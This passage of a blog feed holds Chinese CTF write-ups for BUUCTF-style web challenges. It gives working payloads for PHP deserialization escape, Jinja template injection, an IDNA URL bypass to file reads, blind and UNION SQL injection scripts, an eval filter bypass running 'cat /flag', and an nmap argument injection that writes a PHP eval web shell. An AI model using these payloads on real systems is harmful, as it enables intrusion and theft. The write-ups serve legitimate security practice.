$c-&gt;pass;?&gt;</code></pre><p>结果为</p><pre><code>O:1:&quot;A&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;s:8:&quot;nickname&quot;;a:3:&#123;s:1:&quot;a&quot;;s:5:&quot;Apple&quot;;s:1:&quot;b&quot;;s:6:&quot;banana&quot;;s:1:&quot;c&quot;;s:7:&quot;Coconut&quot;;&#125;&#125;</code></pre><p>可以看到在数组出发生了闭合</p><p>这个时候，我们的nickname[]数组实际长度是39位，除了where，多出来了34位。这个时候strlen(‘where’) == 5 != 39，不是指定的长度会报错，所以我们要想办法把where那块地方，在序列化之后（注意时间点）再增长34位</p><p>那我们就输入34个where增长34位</p><p>所以最后的payload为</p><pre><code> wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre><p>进入到注册页面</p><p><img src="https://s2.loli.net/2022/03/02/o5eVAwpBMGWajJE.png"></p><p>登陆后,在profile页面进行抓包</p><p><img src="https://s2.loli.net/2022/03/02/hBRqIf2KtWvNFz3.png"></p><p>F12进入profile.php链接看到一串base64编码后的字符串</p><p><img src="https://s2.loli.net/2022/03/02/7H4wZIRDrctkng3.png"></p><p>进行解密得到</p><pre><code>&lt;?php $config[&#39;hostname&#39;] = &#39;127.0.0.1&#39;; $config[&#39;username&#39;] = &#39;root&#39;; $config[&#39;password&#39;] = &#39;qwertyuiop&#39;; $config[&#39;database&#39;] = &#39;challenges&#39;;$flag = &#39;flag&#123;7591a142-a543-47ec-b893-0bd28044b39f&#125;&#39;;?&gt;</code></pre><p>你👱🏻‍做了一天,中间几个地方蚌埠住了去看了wp才做出来,属于是顶级</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;你👱🏻‍寒假打了几次比赛,但是做出来的题跟打的比赛次数差不多&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;你👱🏻‍太拉胯了,只能继续看题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;否则你👱🏻‍只能从CTF的世界里Get Out了&lt;/st</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>你爹刷题2</title>
    <link href="http://example.com/2022/02/28/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%982/"/>
    <id>http://example.com/2022/02/28/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%982/</id>
    <published>2022-02-28T14:10:05.000Z</published>
    <updated>2022-03-16T07:42:18.065Z</updated>
    
    <content type="html"><![CDATA[<p><strong>你👱🏻‍寒假打了几次比赛,但是做出来的题跟打的比赛次数差不多</strong></p><p><strong>你👱🏻‍太拉胯了,只能继续看题</strong></p><p><strong>否则你👱🏻‍只能从CTF的世界里Get Out了</strong></p><p><strong>你👱🏻‍现在开学进入下赛季了,但是还是得刷点题</strong></p><h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><p>打开题目可以看到源码,看起来不多</p><pre><code>import flaskimport os app = flask.Flask(__name__) app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;) @app.route(&#39;/&#39;)def index(): return open(__file__).read() @app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)def shrine(shrine):def safe_jinja(s):    s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)    blacklist = [&#39;config&#39;, &#39;self&#39;]    return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + sreturn flask.render_template_string(safe_jinja(shrine))if __name__ == &#39;__main__&#39;:  app.run(debug=True)</code></pre><p>代码中给出了两个路由，第一个是用来显示源代码的</p><p><img src="https://s2.loli.net/2022/02/25/MwV5qDzc8jsuBGO.png"></p><p>试了一下 确实</p><p>看源码app.config[‘FLAG’] = os.environ.pop(‘FLAG’)</p><p>推测{undefined{config}}可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号</p><p>不过python还有一些内置函数，比如url_for和get_flashed_messages</p><p>构造</p><pre><code>/shrine/&#123;&#123;url_for.__globals__&#125;&#125;</code></pre><p><img src="https://s2.loli.net/2022/02/25/V465D7uPTYFWG3R.png"></p><p>看到current_app的意思应该是当前app，那我们就看下当前app的config：</p><pre><code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code></pre><p><img src="https://s2.loli.net/2022/02/25/tRkYMHKgz7fx6OX.png"></p><p>能看到flag</p><h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><p>你👱🏻‍打开题目就看到了源代码</p><pre><code>@app.route(&#39;/getUrl&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def getUrl():url = request.args.get(&quot;url&quot;)host = parse.urlparse(url).hostname #解析出主机名if host == &#39;suctf.cc&#39;:    return &quot;我扌 your problem? 111&quot;parts = list(urlsplit(url))host = parts[1] #再次解析主机名if host == &#39;suctf.cc&#39;:    return &quot;我扌 your problem? 222 &quot; + hostnewhost = []for h in host.split(&#39;.&#39;): #对www.example.com按.划分，先按idna编码，再utf-8解码    newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))parts[1] = &#39;.&#39;.join(newhost) #组合好解码后的主机名#去掉 url 中的空格finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]host = parse.urlparse(finalUrl).hostname #解析出主机名，要等于suctf.ccif host == &#39;suctf.cc&#39;:    return urllib.request.urlopen(finalUrl).read()else:    return &quot;我扌 your problem? 333&quot;</code></pre><p>有一个接口,需要我们提交一个url,用来读取服务器端任意文件</p><p>我们还需要逃脱前面两个if,来达到第三个if,</p><p>而且神必的是这3个判断条件都一样,但是在这之前的host构造不同,</p><p>这里要利用当URL 中出现一些特殊字符的时候，输出的结果可能不在预期</p><p>所以接下来我们需要按照getUrl函数写出爆破脚本得到我们能够逃逸的构造语句</p><p>你👱🏻‍去偷了个脚本</p><pre><code>from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parsedef get_unicode():for x in range(65536):    uni=chr(x)    url=&quot;http://suctf.c&#123;&#125;&quot;.format(uni)    try:        if getUrl(url):            print(&quot;str: &quot;+uni+&#39; unicode: \\u&#39;+str(hex(x))[2:])    except:        passdef getUrl(url):url=urlhost=parse.urlparse(url).hostnameif host == &#39;suctf.cc&#39;:    return Falseparts=list(urlsplit(url))host=parts[1]if host == &#39;suctf.cc&#39;:    return Falsenewhost=[]for h in host.split(&#39;.&#39;):    newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))parts[1]=&#39;.&#39;.join(newhost)finalUrl=urlunsplit(parts).split(&#39; &#39;)[0]host=parse.urlparse(finalUrl).hostnameif host == &#39;suctf.cc&#39;:    return Trueelse:    return Falseif __name__==&#39;__main__&#39;:get_unicode()</code></pre><p>得到</p><p><img src="https://s2.loli.net/2022/02/28/WOpo9KHYEdlCBfk.png"></p><p>比如我们取第一个 复制\u2102</p><p>将\u2102转中文,得到ℂ</p><p>再将ℂ进行url编码</p><p>构造</p><pre><code>file://suctf.cℭ/usr/local/nginx/conf/nginx.conf</code></pre><p>得到flag位置</p><p>再次构造</p><pre><code> file://suctf.cℭ/usr/fffffflag</code></pre><p>得到flag</p><p>Nginx 重要文件目录</p><pre><code>配置文件存放目录：/etc/nginx主要配置文件：/etc/nginx/conf/nginx.conf管理脚本：/usr/lib64/systemd/system/nginx.service模块：/usr/lisb64/nginx/modules应用程序：/usr/sbin/nginx程序默认存放位置：/usr/share/nginx/html日志默认存放位置：/var/log/nginxNginx配置文件：/usr/local/nginx/conf/nginx.conf</code></pre><h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h1><p>你👱🏻‍打开题目,给你👱🏻‍吓沉了两艘船</p><p><img src="https://s2.loli.net/2022/02/28/Igj8EMT3CvbnKWs.png"></p><p>你👱🏻‍F12发现一个链接</p><p><img src="https://s2.loli.net/2022/02/28/51ArzytwbR3ds6F.png"></p><p>点进去</p><p><img src="https://s2.loli.net/2022/02/28/Tsr3zvRmJULbMq1.png"></p><p>这里考察的是反序列化</p><p>主要看这里</p><pre><code>public function __destruct()&#123;    $a = $this-&gt;a;    $b = $this-&gt;b;    echo $b($a);&#125;</code></pre><p>可以构造变量a—&gt;phpinfo()，变量b—&gt;assert</p><p>assert()可以将整个字符串参数当作php参数执行，而类似的eval()函数是执行合法的php代码</p><p>这是序列化脚本</p><pre><code>&lt;?phpclass HelloPhp&#123;   public $a;   public $b;    &#125;$c = new HelloPhp;$c-&gt;b = &#39;assert&#39;;$c-&gt;a = &#39;phpinfo();&#39;;echo serialize($c);?&gt;</code></pre><p>得到</p><pre><code>O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</code></pre><p>payload:</p><pre><code>?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</code></pre><p>ctrl+F搜索flag得到答案</p><h1 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h1><p>你👱🏻‍打开题目,并且试了试那两个api地址然后失败</p><p><img src="https://s2.loli.net/2022/03/01/poTvdxwAP64e5ZW.png"></p><p>看到XFF,一般来说是要在抓包里面加个X-Forwarded-For:127.0.0.1</p><p><img src="https://s2.loli.net/2022/03/01/Tb7RLB4JMAjIpdN.png"></p><p>这里的ip跟上面有所变化,可能存在注入</p><p><img src="https://s2.loli.net/2022/03/01/lgPQ3TwDvmn514Z.png"></p><p>这里确实存在注入</p><p><img src="https://s2.loli.net/2022/03/01/DUeGhX5AVFC2qna.png"></p><p>获取目录文件</p><p><img src="https://s2.loli.net/2022/03/01/GVObwD61n4ZrKXy.png"></p><p>得到flag</p><h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><p>你👱🏻‍进入题目,这里点那5个东西肯定是没用的,肯定要登录成功或者注入什么东西</p><p><img src="https://s2.loli.net/2022/03/01/W1EADrILnsNcZtx.png"></p><p>用户名为1的时候提示你👱🏻‍错误的用户名和密码</p><p>用户名为admin的时候</p><p><img src="https://s2.loli.net/2022/03/01/1qemz4bGljo2fBF.png"></p><p>为1’的时候同上</p><p>应该是被检测到了</p><p>发现这里url有东西</p><p>又因为为5的时候提示在第六个</p><p>所以果断讲id改成6</p><p><img src="https://s2.loli.net/2022/03/01/BxMUJQvYcbr3VIA.png"></p><p>提示我不是这个表</p><p>难道是url注入吗</p><p><img src="https://s2.loli.net/2022/03/01/sPegj2aE4c89Mid.png"></p><p>对登录处进行fuzz测试,发现大部分被ban</p><p><img src="https://s2.loli.net/2022/03/01/SNDvwsfIpo8AnJa.png"></p><p>再对id处进行fuzz测试</p><p>发现回显只有两种,应该涉及到盲注</p><p>偷个用二分法写的脚本</p><pre><code>import requestsimport reimport strings = requests.session()url = &quot;http://  e0b33d7f-5e2e-435b-83a6-4a60597dbb8b.node4.buuoj.cn:81/search.php&quot;table = &quot;&quot;for i in range(1, 250):print(i)high = 128low = 31while (low &lt;= high):    mid = (low + high) // 2    # 爆库名    #  1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))&gt;1)^1    &#39;&#39;&#39;    payload11 = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))=%d)^1&quot;%(i,mid)    payload12 = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&lt;%d)^1&quot;%(i,mid)    payload13 = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,mid)    &#39;&#39;&#39;    # 爆表名    # payload2 = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#39;geek&#39;),%d,1))=%d)^1&quot;%(i,mid)    &#39;&#39;&#39;    payload11 = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#39;geek&#39;),%d,1))=%d)^1&quot;%(i,mid)    payload12 = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#39;geek&#39;),%d,1))&lt;%d)^1&quot;%(i,mid)    payload13 = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#39;geek&#39;),%d,1))&gt;%d)^1&quot;%(i,mid)    &#39;&#39;&#39;    # 爆字段名    # payload3 = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;F1naI1y&#39;)),%d,1))=%d)^1&quot;%(i,mid)    &#39;&#39;&#39;    payload11 = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;F1naI1y&#39;)),%d,1))=%d)^1&quot;%(i,mid)    payload12 = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;F1naI1y&#39;)),%d,1))&lt;%d)^1&quot;%(i,mid)    payload13 = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;F1naI1y&#39;)),%d,1))&gt;%d)^1&quot;%(i,mid)    &#39;&#39;&#39;    # 爆字段值    # payload4 = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))=%d)^1&quot;%(i,mid)    payload11 = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))=%d)^1&quot; % (i, mid)    payload12 = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&lt;%d)^1&quot; % (i, mid)    payload13 = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; % (i, mid)    ra11 = s.get(url=url + &quot;?id=&quot; + payload11).text    ra12 = s.get(url=url + &quot;?id=&quot; + payload12).text    ra13 = s.get(url=url + &quot;?id=&quot; + payload13).text    if &#39;Click&#39; in ra11:        table += chr(mid)        print(table)        break    if &#39;Click&#39; in ra12:        # print (&quot;&#39;low=&#39;+%d + &#39;high=&#39; + %d&quot;%(low,high))        high = mid - 1    if &quot;Click&quot; in ra13:        # print (&quot;&#39;low=&#39;+%d + &#39;high=&#39; + %d&quot;%(low,high))        low = mid + 1</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;你👱🏻‍寒假打了几次比赛,但是做出来的题跟打的比赛次数差不多&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;你👱🏻‍太拉胯了,只能继续看题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;否则你👱🏻‍只能从CTF的世界里Get Out了&lt;/st</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>快乐寒假6</title>
    <link href="http://example.com/2022/02/21/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%876/"/>
    <id>http://example.com/2022/02/21/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%876/</id>
    <published>2022-02-21T14:10:05.000Z</published>
    <updated>2022-02-27T09:47:10.108Z</updated>
    
    <content type="html"><![CDATA[<p><strong>你👱🏻‍寒假打了几次比赛,但是做出来的题跟打的比赛次数差不多</strong></p><p><strong>你👱🏻‍太拉胯了,只能继续看题</strong></p><p><strong>否则你👱🏻‍只能从CTF的世界里Get Out了</strong></p><h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h1><p>你👱🏻‍打开网站看源码</p><p><img src="https://s2.loli.net/2022/02/21/nXdTi1l8ky6ACvr.png"></p><p>根据提示先看phpinfo</p><p><img src="https://s2.loli.net/2022/02/22/sdj1mGFROw2neZM.png"></p><p>这里得直接搜一些敏感点如fopen,disable_,root等等</p><p>再逐步审计代码</p><p>filter函数就是正则匹配 /php|flag|php5|php4|fl1g/i 替换为空</p><p>中间一大串就是给session初始化</p><p>将session序列化之后调用filter函数</p><p>最后我们需要file_get_contents读取文件</p><p>d0g3_f1ag.php直接读是读不到的</p><p>我们需要base64_decode($userinfo[‘img’])=d0g3_f1ag.php</p><p>那么需要$userinfo[‘img’]=ZDBnM19mMWFnLnBocA==</p><p>而$userinfo又是通过$serialize_info反序列化来的</p><p>$serialize_info又是通过session序列化之后再过滤得来的</p><p>session的img在img_path这里赋值,</p><pre><code>if(!$_GET[&#39;img_path&#39;])&#123;$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;$_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;</code></pre><p>但是filter会过滤掉php flag等关键字,所以这个地方需要处理</p><p>你👱🏻‍搜了一下,这里涉及到php反序列化字符逃逸</p><p>在php中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化<br>例如：</p><pre><code>&lt;?php$str=&#39;a:2:&#123;i:0;s:8:&quot;aew1ec0g&quot;;i:1;s:5:&quot;aaa11&quot;;&#125;&#39;;var_dump(unserialize($str));</code></pre><p>输出结果:</p><pre><code>array(2) &#123; [0]=&gt; string(8) &quot;aew1ec0g&quot; [1]=&gt; string(5) &quot;aaa11&quot; &#125;</code></pre><p>一般我们会认为，只要增加或去除str的任何一个字符都会导致反序列化的失败。 但是事实并非如此，如果我们在str结尾的花括号后再增加一些字符呢？</p><p>比如：</p><pre><code> &lt;?php$str=&#39;a:2:&#123;i:0;s:8:&quot;aew1ec0g&quot;;i:1;s:5:&quot;aaa11&quot;;&#125;abc&#39;;var_dump(unserialize($str));</code></pre><p>依然可以得到上面的结果</p><p>这说明反序列化的过程是有一定识别范围的，在这个范围之外的字符(第二个例子里的abc)都会被忽略，不影响反序列化的正常进行</p><p>代入题目中</p><pre><code>&lt;?php$_SESSION[&quot;user&quot;]=&#39;flagflagflagflagflagflag&#39;；$_SESSION[&quot;function&quot;]=&#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&#39;;$_SESSION[&quot;img&quot;]=&#39;L2QwZzNfZmxsbGxsbGFn&#39;;echo serialize($_SESSION);</code></pre><p>结果为</p><pre><code>a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</code></pre><p>如果后台将flag的字符替换为空</p><pre><code>a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</code></pre><p>此时将这串字符串进行序列化</p><p>这个时候关注第二个s所对应的数字，本来由于有6个flag字符所以为24，现在这6个flag都被过滤了，</p><p>那么它将会尝试向后读取24个字符看看是否满足序列化的规则，也即读取;s:8:”function”;s:59:”a,读取这24个字符后以”;结尾，</p><p>恰好满足规则，而后第三个s向后读取img的20个字符，第四个、第五个s向后读取均满足规则，所以序列化结果为：</p><pre><code>array(3) &#123; [&quot;user&quot;]=&gt; string(24) &quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot; [&quot;img&quot;]=&gt; string(20) &quot;ZDBnM19mMWFnLnBocA==&quot; [&quot;dd&quot;]=&gt; string(1) &quot;a&quot; &#125;</code></pre><p>SESSION数组的键值img对应的值发生了改变</p><p>如果我们能够控制原来SESSION数组的funcion的值但无法控制img的值，我们就可以通过这种方式间接控制到img对应的值。</p><p>这个感觉就像sql注入一样，他本来想读取的base64编码是：L2QwZzNfZmxsbGxsbGFn,但是由于过滤掉了flag,向后读取的过程中把键值function放到了第一个键值的内容里面，用ZDBnM19mMWFnLnBocA==代替了真正的base64编码，读取了d0g3_f1ag.php的内容。</p><p>而识别完成后最后面的”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;}被忽略掉了，不影响正常的反序列化过程</p><p>所以构造payload：</p><pre><code> get:f=show_image  post:_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></pre><p>回显</p><pre><code>&lt;?php$flag = &#39;flag in /d0g3_fllllllag&#39;;?&gt;</code></pre><p>base64(d0g3_fllllllag)=L2QwZzNfZmxsbGxsbGFn</p><pre><code> get:f=show_image  post:_SESSION[fl1gfl1g]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</code></pre><p>得到flag</p><h1 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h1><p>你👱🏻‍打开题目看到源码</p><p><img src="https://s2.loli.net/2022/02/23/TNYBjPvlR6toMeA.png"></p><p>首先是审计源码</p><p>scandir() 函数：返回指定目录中的文件和目录的数组。</p><p>base_convert() 函数：在任意进制之间转换数字。</p><p>dechex() 函数：把十进制转换为十六进制。</p><p>hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。</p><p>var_dump() ：函数用于输出变量的相关信息。</p><p>readfile() 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。</p><p>语法：readfile(filename,include_path,context)</p><p>过滤后可以使用白名单中的数学函数，.,^等，同时长度限制在80个字符以内,要得到flag 只靠几个数学函数是没用的,得想办法构造函数被eval执行</p><p>构造system(“cat /flag”)会受到函数和引号限制,引号删掉后命令依然可以执行,而对于函数,可以利用动态函数的性质,用字符串做函数名,加上括号就会被当成函数执行。</p><p>这里要熟悉两个php特点</p><pre><code>动态函数php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数例如：$function = &quot;sayHello&quot;;$function();php中函数名默认为字符串例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择</code></pre><p>比如</p><pre><code>    c=($_GET[a])($_GET[b])</code></pre><p>如果a=system,b=cat /flag,就可以执行system(cat /flag)。</p><p>所以可以写成</p><pre><code> c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag</code></pre><p>但是白名单会检测c中出现的变量名,a和b都不能出现,但是可以用白名单的值,GET中括号和和GET本身都不能出现，中括号可以用{}替代，因此这道题的核心就是构造_GET。</p><p>所以构造如下</p><pre><code>base_convert(37907361743,10,36)(dechex(1598506324))</code></pre><p>因为:</p><pre><code>base_convert(37907361743,10,36)=&gt;&quot;hex2bin&quot;，dechex(1598506324)=&gt;&quot;5f474554&quot;hex2bin(&quot;5f474554&quot;)=&gt;_GET</code></pre><p>为了不让结果太长，需要用一个白名单变量来保存上述值,最好用最短的pi，否则长度很容易超限制。</p><p>所以得到最终payload为</p><pre><code>   c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;cos&#125;)&amp;pi=system&amp;cos=cat /flag</code></pre><p>得到flag</p><h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><p>你👱🏻‍打开是这个样子</p><p><img src="https://s2.loli.net/2022/02/25/KrTUAtXYeO9cl3C.png"></p><p>看起来很乱,其实是源🐴</p><p>整理完后发现是flask框架</p><p>geneSign是对传入的param与其他字符串拼接并返回其md5值</p><p>De1ta是主要,传入3个参数以及ip,先判断param是否是gopher或者file开头的参数,不过则过到Task中并返回task的Exec()函数结果,另外hint提示在flag.txt中有flag</p><p>现在打开De1ta,并传参action=scan,param=flag.txt,sign=94130db2c6dc650b303b28b8dd307c71637063,一步步操作来找出条件,先传参,再进入Exec()函数,</p><p>先使用checkSign函数检验sign，所以我们需要getSign(self.action, self.param) == self.sign成立，这个可以通过geneSign来获取</p><p>然后2个if，判断scan或read 是否在action内，在则，前者是把param对应文件的内容写入result.txt，后者是把result.txt取出来并返还给我们，也就是说，这2个if我们都需要调用，这样就能获取到flag，而scan和read的判断是包含，所以我们的action就可以是readscan，或者scanread，那sign怎么获取呢？</p><p>我们要绕过getSign(self.action, self.param) == self.sign的同时还需要action为readscan，或者scanread</p><p>getsign函数为</p><pre><code>def getSign(action, param):return hashlib.md5(secert_key + param + action).hexdigest()</code></pre><p>他用param和action做拼接,而action是固定的scan</p><p>我们先使用geneSign,传参为flag.txtread然后拼接为flag.txtreadscan，生成sign保存下来</p><p>得到072df7309130a4d57a36026390d7f3ca</p><p>再传参数param=flag.txt   action=readscan   sign=072df7309130a4d57a36026390d7f3ca</p><p><img src="https://s2.loli.net/2022/02/25/49RXsG3ntqrwaSL.png"></p><h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><p>你👱🏻‍打开题目是个登录界面</p><p><img src="https://s2.loli.net/2022/02/26/L4sIoKC2dOT39XN.png"></p><p>随便注册登录后</p><p><img src="https://s2.loli.net/2022/02/26/uCPexLyoDOmXV98.png"></p><p>找一下注入点,发现在发布广告的地方可以注入</p><p>输入1’</p><p><img src="https://s2.loli.net/2022/02/26/bsZ8FUS1JmaEwLz.png"></p><p>可能有SQL注入</p><p><img src="https://s2.loli.net/2022/02/26/YcCJepi5yKQx1EV.png"></p><p>发现过滤了空格</p><p>使用/xx/绕过</p><pre><code>1&#39;/**/union/**/select/**/1,2,3/**/&#39;</code></pre><p><img src="https://s2.loli.net/2022/02/26/No715AOhHrpLVZW.png"></p><p>往后面一直加到22列</p><pre><code>1&#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code></pre><p><img src="https://s2.loli.net/2022/02/26/fqnihuUBd6gwkYL.png"></p><p>查表</p><pre><code> 1&#39;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code></pre><p><img src="https://s2.loli.net/2022/02/26/6a7YsfEQCrSuZmj.png"></p><p>设第二列别名为b</p><pre><code> 1&#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/b,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code></pre><p><img src="https://s2.loli.net/2022/02/26/npMyzXD5S4CIbLT.png"></p><p>设第三列别名为b查flag</p><pre><code> 1&#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code></pre><p><img src="https://s2.loli.net/2022/02/26/KFlifrJ3g5C2aAX.png"></p><p>得到flag</p><h1 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h1><p><a href="https://fohunbrella.github.io/2022/02/06/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%873/">https://fohunbrella.github.io/2022/02/06/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%873/</a></p><p>之前做过nmap的题,这里又遇到了</p><p>将之前的payload</p><pre><code> 127.0.0.1 | &#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG test.php&#39;</code></pre><p>放进去试试</p><p><img src="https://s2.loli.net/2022/02/27/caT81q5HEpGl37s.png"></p><p>你👱🏻‍fail了</p><p>这里应该是过滤了东西,所以再改改试试</p><pre><code> 127.0.0.1 | &#39; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG test.phtml &#39;</code></pre><p>上传成功,去看看传的🐴</p><p><img src="https://s2.loli.net/2022/02/27/3PNjwAoMSd72DOU.png"></p><p>得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;你👱🏻‍寒假打了几次比赛,但是做出来的题跟打的比赛次数差不多&lt;/strong&gt;&lt;/p&gt;
